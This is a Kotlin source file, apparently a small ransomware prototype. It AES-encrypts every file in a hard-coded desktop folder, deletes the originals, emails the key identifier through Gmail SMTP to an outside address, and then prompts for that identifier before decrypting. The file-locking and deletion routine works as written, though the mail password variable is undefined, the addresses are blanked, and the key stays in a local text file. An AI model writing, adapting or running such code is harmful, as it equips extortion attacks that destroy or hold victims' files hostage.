package happyPackIdPorCorreo

import java.io.File
import java.security.Key
import java.util.Base64
import java.util.UUID
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.spec.SecretKeySpec
import javax.mail.*
import javax.mail.internet.*
import java.util.Properties

fun main() {
    val directorioEscritorio = "C:\\Users\\ayala\\OneDrive\\Escritorio\\prueba"
    val clave = generarClaveSimetrica()
    val idClave = UUID.randomUUID().toString()

    guardarClaveConId(idClave, clave)

    val archivos = File(directorioEscritorio).listFiles()
    archivos?.forEach { archivo ->
        if (archivo.isFile && !archivo.name.endsWith(".enc")) {
            println("Cifrando archivo: ${archivo.name}")
            cifrarArchivo(archivo, clave)
            archivo.delete()
        }
    }

    enviarIdPorCorreo(idClave)

    println("Introduce el ID de la clave para descifrar los archivos:")
    val idClaveIntroducido = readLine()?.trim()

    if (idClaveIntroducido != null) {
        val claveDesencriptada = recuperarClavePorId(idClaveIntroducido)

        if (claveDesencriptada != null) {
            val archivosCifrados = File(directorioEscritorio).listFiles()
            archivosCifrados?.forEach { archivo ->
                if (archivo.isFile && archivo.name.endsWith(".enc")) {
                    descifrarArchivo(archivo, claveDesencriptada)
                    archivo.delete()
                }
            }
            println("Archivos descifrados con éxito.")
        } else {
            println("ID de clave no válido. Los archivos no se han descifrado.")
        }
    } else {
        println("ID no válido. Los archivos no se han descifrado.")
    }
}

fun generarClaveSimetrica(): Key {
    val keyGen = KeyGenerator.getInstance("AES")
    keyGen.init(128) // Tamaño de clave: 128 bits
    return keyGen.generateKey()
}

fun cifrarArchivo(archivo: File, clave: Key) {
    val cipher = Cipher.getInstance("AES")
    cipher.init(Cipher.ENCRYPT_MODE, clave)

    val bytes = archivo.readBytes()
    val resultado = cipher.doFinal(bytes)

    val archivoCifrado = File("${archivo.absolutePath}.enc")
    archivoCifrado.writeBytes(resultado)

    println("Archivo cifrado: ${archivoCifrado.name}")
}

fun descifrarArchivo(archivo: File, clave: Key) {
    val cipher = Cipher.getInstance("AES")
    cipher.init(Cipher.DECRYPT_MODE, clave)

    val bytes = archivo.readBytes()
    val resultado = cipher.doFinal(bytes)

    val archivoDescifrado = File(archivo.absolutePath.removeSuffix(".enc"))
    archivoDescifrado.writeBytes(resultado)

    println("Archivo descifrado: ${archivoDescifrado.name}")
}

fun convertirClaveDesdeBase64(base64: String): Key {
    val bytes = Base64.getDecoder().decode(base64)
    return SecretKeySpec(bytes, "AES")
}

fun enviarIdPorCorreo(idClave: String) {
    val correoDestino = "@dominio.com"
    val correoRemitente = "@gmail.com"


    val propiedades = Properties().apply {
        put("mail.smtp.host", "smtp.gmail.com")
        put("mail.smtp.port", "587")
        put("mail.smtp.auth", "true")
        put("mail.smtp.starttls.enable", "true")
    }

    val session = Session.getInstance(propiedades, object : Authenticator() {
        override fun getPasswordAuthentication(): PasswordAuthentication {
            return PasswordAuthentication(correoRemitente, contraseñaCorreo)
        }
    })

    try {
        val mensaje = MimeMessage(session).apply {
            setFrom(InternetAddress(correoRemitente))
            addRecipient(Message.RecipientType.TO, InternetAddress(correoDestino))
            subject = "ID de la clave de cifrado"
            setText("Aquí está el ID de la clave de cifrado: $idClave")
        }
        Transport.send(mensaje)
        println("ID de la clave enviado por correo.")
    } catch (e: MessagingException) {
        println("Error al enviar el correo: ${e.message}")
        e.printStackTrace()
    }
}

fun guardarClaveConId(idClave: String, clave: Key) {
    val claveBase64 = Base64.getEncoder().encodeToString(clave.encoded)
    val archivoClave = File("clave_${idClave}.txt")
    archivoClave.writeText("ID: $idClave\nClave: $claveBase64")
    println("Clave guardada con el ID: $idClave")
}

fun recuperarClavePorId(idClave: String): Key? {
    val archivoClave = File("clave_${idClave}.txt")
    return if (archivoClave.exists()) {
        val contenido = archivoClave.readText()
        val claveBase64 = contenido.substringAfter("Clave: ").trim()
        convertirClaveDesdeBase64(claveBase64)
    } else {
        println("No se encontró la clave para el ID $idClave.")
        null
    }
}
